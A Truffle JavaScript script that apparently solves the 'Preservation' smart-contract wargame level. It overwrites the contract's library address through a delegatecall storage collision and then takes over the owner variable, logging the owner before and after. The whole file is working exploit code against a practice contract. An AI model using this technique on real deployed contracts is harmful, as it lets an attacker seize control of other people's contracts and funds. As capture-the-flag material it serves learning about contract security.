const Preservation = artifacts.require("Preservation");
const PreservationAttack = artifacts.require("PreservationAttack");

// change these constants according to your needs
const PreservationInstanceAddress = "0x3a940f09b9a1cfab9f7975cbbe86baadfa71dc1c";
const PreservationAttackInstanceAddress = "0x972285ebcb6e221640cb3780340fa0a6b5edd396";
const UintValueOfPreservationAttackInstanceAddress = "862827497901940087043135422214691766112271324054";
const MyAccount = "0xd80e643cb7d8e81a4cd927b6fbb743fa9b8eb8d9";

async function execute(callback){
  let preservationInstance = Preservation.at(PreservationInstanceAddress);
  let preservationAttackInstance = PreservationAttack.at(PreservationAttackInstanceAddress);

  // get first owner
  let owner = await preservationInstance.owner.call();
  console.log("Preservation Instance Owner:", owner);

  // set new library address
  await preservationInstance.setFirstTime(UintValueOfPreservationAttackInstanceAddress);
  let timezone1LibraryAddress = await preservationInstance.timeZone1Library.call();
  console.log("Timezone 1 Library Address:",timezone1LibraryAddress);

  // attack: change owner to our account address
  await preservationAttackInstance.setTime(1);
  let newOwner = await preservationInstance.owner.call();
  console.log("Preservation Instance New Owner:",newOwner);
  callback();
}

module.exports = execute;
